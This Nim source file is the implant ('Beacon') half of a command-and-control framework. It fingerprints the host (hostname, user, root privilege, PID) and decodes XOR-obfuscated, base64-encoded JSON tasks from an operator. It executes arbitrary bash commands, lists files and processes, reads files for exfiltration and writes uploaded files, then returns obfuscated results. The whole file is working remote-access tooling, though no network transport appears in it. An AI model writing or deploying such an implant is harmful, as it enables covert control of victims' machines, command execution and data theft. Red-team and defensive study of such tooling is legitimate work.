import json
import std/strutils
import os
import osproc
import std/base64
import std/random
import std/tables
import std/options
import system
import posix
# import psutil


proc toString*(str: seq[uint8]): string =
  result = newStringOfCap(len(str))
  for ch in str:
    add(result, char(ch))


proc xorEncode*(key, data: string): seq[uint8] =
  var result: seq[uint8]
  if key.len == 0:
    for ch in data:
      result.add(uint8(int(ch)))
    return result

  var j = 0
  for i in countup(0, data.len - 1):
    if j == key.len:
      j = 0
    result.add(uint8(int(data[i])) xor uint8(int(key[j])))
    inc j

  result

const
  instructionMsgTag* = "INS"
  uuidMsgTag* = "UID"
  cmdMsgTag* = "CM"
  returnValueTag* = "RV"
  inputFileTag* = "IF"
  outputFileTag* = "OF"
  dataTag* = "DA"
  argsTag* = "AR"
  pidTag* = "PI"
  errorCodeTag* = "EC"

  beaconHashMsgTag* = "BH"
  listenerHashMsgTag* = "LH"
  usernameMsgTag* = "UN"
  hostnameMsgTag* = "HN"
  archMsgTag* = "ARC"
  privilegeMsgTag* = "PR"
  osMsgTag* = "OS"
  lastProofOfLifeMsgTag* = "POF"
  sessionsMsgTag* = "SS"
  internalIpsMsgTag* = "IIPS"
  processIdMsgTag* = "PID"
  additionalInfoMsgTag* = "ADI"


type
  C2Message* = object
    instruction*: string
    cmd*: string
    returnValue*: string
    inputFile*: string
    outputFile*: string
    data*: string
    args*: string
    uuid*: string
    pid*: int
    errorCode*: Option[int]


type
    Beacon* = ref object of RootObj
        beaconHash*: string
        hostname*: string
        username*: string
        arch*: string
        privilege*: string
        os*: string
        listenerHash*: string
        lastProofOfLife*: string
        internalIps*: string
        processId*: string
        additionalInfo*: string
        sleepTimeMs*: int
        xorKey*: string

        tasks: seq[C2Message]
        taskResults*: seq[C2Message]


proc initBeacon*(self: Beacon) =

    var alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    randomize()
    var hash = ""
    for i in 0..32-1:
        hash = hash & alphabet[rand(len(alphabet)-1)]

    self.beaconHash = hash
    const size = 256

    let hostname = newString(size)
    var success = gethostname(hostname, size) == 0
    let nullPos = hostname.find('\0')
    self.hostname = hostname
    if nullPos != -1:
        let finalHostname = hostname.substr(0, nullPos - 1)
        self.hostname = finalHostname

    var uid = geteuid()
    var gid = getegid()

    var login: cstring
    login = getlogin()
    
    self.username = $login
    self.arch = hostCPU
    if gid==0 or uid==0:
        self.privilege = "high"
    else:
        self.privilege = "low"
    self.os = hostOS
    self.sleepTimeMs = 1000
    self.listenerHash = ""
    self.lastProofOfLife = "0"
    self.internalIps = ""
    self.processId = $getpid()
    self.additionalInfo = ""
    self.xorKey = ""
    self.tasks = @[]
    self.taskResults = @[]


proc encodeString(data: string): string =
  if data.len == 0:
    return ""
  encode(data.toOpenArrayByte(0, data.high))


proc decodeString(data: string): string =
  if data.len == 0:
    return ""
  try:
    return decode(data)
  except CatchableError:
    return ""


proc cmdToTasks*(self: Beacon, input: string) =
  if isEmptyOrWhitespace(input):
    return

  var decoded: string
  try:
    decoded = decode(input)
  except CatchableError:
    return

  let transformed = xorEncode(self.xorKey, decoded)
  let payload = toString(transformed)

  var jsonNode: JsonNode
  try:
    jsonNode = parseJson(payload)
  except JsonParsingError:
    return

  if jsonNode.kind != JArray:
    return

  for bundleNode in jsonNode:
    if bundleNode.kind != JObject:
      continue

    if bundleNode.hasKey(listenerHashMsgTag):
      self.listenerHash = bundleNode[listenerHashMsgTag].getStr()
    if bundleNode.hasKey(usernameMsgTag):
      self.username = bundleNode[usernameMsgTag].getStr()
    if bundleNode.hasKey(hostnameMsgTag):
      self.hostname = bundleNode[hostnameMsgTag].getStr()
    if bundleNode.hasKey(archMsgTag):
      self.arch = bundleNode[archMsgTag].getStr()
    if bundleNode.hasKey(privilegeMsgTag):
      self.privilege = bundleNode[privilegeMsgTag].getStr()
    if bundleNode.hasKey(osMsgTag):
      self.os = bundleNode[osMsgTag].getStr()
    if bundleNode.hasKey(lastProofOfLifeMsgTag):
      self.lastProofOfLife = bundleNode[lastProofOfLifeMsgTag].getStr()
    if bundleNode.hasKey(internalIpsMsgTag):
      self.internalIps = bundleNode[internalIpsMsgTag].getStr()
    if bundleNode.hasKey(processIdMsgTag):
      self.processId = bundleNode[processIdMsgTag].getStr()
    if bundleNode.hasKey(additionalInfoMsgTag):
      self.additionalInfo = bundleNode[additionalInfoMsgTag].getStr()

    let beaconHash = if bundleNode.hasKey(beaconHashMsgTag): bundleNode[beaconHashMsgTag].getStr() else: ""
    if beaconHash != self.beaconHash:
      continue

    if not bundleNode.hasKey(sessionsMsgTag):
      continue

    let sessions = bundleNode[sessionsMsgTag]
    if sessions.kind != JArray:
      continue

    for sessionNode in sessions:
      if sessionNode.kind != JObject:
        continue

      var message = C2Message(pid: -100, errorCode: none(int))

      if sessionNode.hasKey(instructionMsgTag):
        message.instruction = sessionNode[instructionMsgTag].getStr()
      if sessionNode.hasKey(cmdMsgTag):
        message.cmd = sessionNode[cmdMsgTag].getStr()
      if sessionNode.hasKey(argsTag):
        message.args = sessionNode[argsTag].getStr()
      if sessionNode.hasKey(uuidMsgTag):
        message.uuid = sessionNode[uuidMsgTag].getStr()
      if sessionNode.hasKey(pidTag):
        message.pid = sessionNode[pidTag].getInt()
      if sessionNode.hasKey(errorCodeTag):
        message.errorCode = some(sessionNode[errorCodeTag].getInt())

      if sessionNode.hasKey(returnValueTag):
        message.returnValue = decodeString(sessionNode[returnValueTag].getStr())
      if sessionNode.hasKey(inputFileTag):
        message.inputFile = decodeString(sessionNode[inputFileTag].getStr())
      if sessionNode.hasKey(outputFileTag):
        message.outputFile = decodeString(sessionNode[outputFileTag].getStr())
      if sessionNode.hasKey(dataTag):
        message.data = decodeString(sessionNode[dataTag].getStr())

      self.tasks.add(message)


proc execInstruction*(self: Beacon) =
  for task in self.tasks:
    var instruction = task.instruction
    var args = task.args
    var cmd = task.cmd
    var data = task.data
    var inputFile = task.inputFile
    var outputFile = task.outputFile
    var pid = task.pid

    var result = ""
    case instruction:
    of "ls":
      if cmd.len == 0:
        cmd = getCurrentDir()
      let safeCmd = quoteShell(cmd)
      result = execProcess("bash", args=["-c", "ls -la " & safeCmd], options={poUsePath})
    of "ps":
      result = execProcess("bash", args=["-c", "ps -aux"], options={poUsePath})
    of "cd":
      try:
        setCurrentDir(cmd)
        result = getCurrentDir()
      except OSError:
        result = "Failed to change directory"
    of "pwd":
      result = getCurrentDir()
    of "download":
      if fileExists(inputFile):
        try:
          var fileHandler = open(inputFile, fmRead)
          data = fileHandler.readAll()
          fileHandler.close()
          result = "OK."
        except IOError:
          result = "Failed to read file"
      else:
        result = "File doesn't exist."
    of "upload":
      if fileExists(outputFile):
        result = "File already exists."
      else:
        try:
          var fileHandler = open(outputFile, fmWrite)
          fileHandler.write(data)
          fileHandler.close()
          result = "OK."
        except IOError:
          result = "Failed to write file"
    of "run":
      result = execProcess("bash", args=["-c", cmd], options={poUsePath})
    of "sleep":
      if not isEmptyOrWhitespace(cmd):
        try:
          self.sleepTimeMs = parseInt(cmd) * 1000
          result = "OK."
        except ValueError:
          result = "Invalid sleep value"
      else:
        result = "Missing sleep value"
    else:
      result = "Unknown instruction"

    var taskResult = C2Message(
      instruction: instruction,
      cmd: cmd,
      args: args,
      data: data,
      inputFile: inputFile,
      outputFile: outputFile,
      pid: pid,
      uuid: task.uuid,
      returnValue: result,
      errorCode: none(int)
    )
    self.taskResults.add(taskResult)

  self.tasks.setLen(0)


proc taskResultsToCmd*(self: Beacon): string =
  var sessions = newJArray()

  for message in self.taskResults:
    var node = newJObject()
    if message.instruction.len > 0:
      node[instructionMsgTag] = %message.instruction
    if message.cmd.len > 0:
      node[cmdMsgTag] = %message.cmd
    if message.returnValue.len > 0:
      node[returnValueTag] = %encodeString(message.returnValue)
    if message.inputFile.len > 0:
      node[inputFileTag] = %encodeString(message.inputFile)
    if message.outputFile.len > 0:
      node[outputFileTag] = %encodeString(message.outputFile)
    if message.data.len > 0:
      node[dataTag] = %encodeString(message.data)
    if message.args.len > 0:
      node[argsTag] = %message.args
    if message.pid != -100:
      node[pidTag] = %message.pid
    if message.errorCode.isSome:
      node[errorCodeTag] = %message.errorCode.get()
    if message.uuid.len > 0:
      node[uuidMsgTag] = %message.uuid

    sessions.add(node)

  var bundle = newJObject()
  if self.beaconHash.len > 0:
    bundle[beaconHashMsgTag] = %self.beaconHash
  if self.listenerHash.len > 0:
    bundle[listenerHashMsgTag] = %self.listenerHash
  if self.username.len > 0:
    bundle[usernameMsgTag] = %self.username
  if self.hostname.len > 0:
    bundle[hostnameMsgTag] = %self.hostname
  if self.arch.len > 0:
    bundle[archMsgTag] = %self.arch
  if self.privilege.len > 0:
    bundle[privilegeMsgTag] = %self.privilege
  if self.os.len > 0:
    bundle[osMsgTag] = %self.os
  if self.lastProofOfLife.len > 0:
    bundle[lastProofOfLifeMsgTag] = %self.lastProofOfLife
  if self.internalIps.len > 0:
    bundle[internalIpsMsgTag] = %self.internalIps
  if self.processId.len > 0:
    bundle[processIdMsgTag] = %self.processId
  if self.additionalInfo.len > 0:
    bundle[additionalInfoMsgTag] = %self.additionalInfo
  if sessions.len > 0:
    bundle[sessionsMsgTag] = sessions

  var multi = newJArray()
  multi.add(bundle)

  let serialized = $multi
  let encrypted = xorEncode(self.xorKey, serialized)
  let encoded = encode(encrypted)

  self.taskResults.setLen(0)

  encoded
